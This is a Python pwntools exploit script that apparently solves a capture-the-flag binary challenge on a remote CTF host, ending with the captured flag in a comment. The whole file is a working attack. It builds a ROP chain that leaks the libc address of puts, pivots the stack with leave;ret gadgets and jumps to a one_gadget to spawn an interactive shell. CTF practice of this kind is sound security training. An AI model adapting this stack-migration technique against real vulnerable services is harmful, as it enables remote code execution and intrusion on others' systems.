#!/usr/bin/python
from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10131
#host = 'localhost'
#port = 4000

r = remote(host, port)
raw_input('#')
pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
leave_ret = 0x0000000000400818

read_plt = 0x400610
puts_plt = 0x4005e0
puts_got = 0x0000000000600fc8
main_read = 0x4007c4

one_gadget = 0x10a38c
puts_base = 0x00000000000809c0

buf1 = 0x601060
buf2 = 0x602000 - 0x100
r.recvuntil(':')
rop1 = flat([buf2, pop_rdi, puts_got, puts_plt, main_read])
r.send(rop1.rjust(0x280, '\x00'))
r.recvuntil('say?\n')
r.send('\x00'*0x20 + p64(buf1 + 0x280 - 8*5) + p64(leave_ret))
r.recvuntil('~\n')
puts_libc = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
one_gadget = puts_libc - puts_base + one_gadget

print ('one gadget : ', hex(one_gadget))
r.sendline('\x00'*0x28 + p64(one_gadget))
r.interactive()
#FLAG{st4ck_m1gr4t10n_15_p0werfu1!}
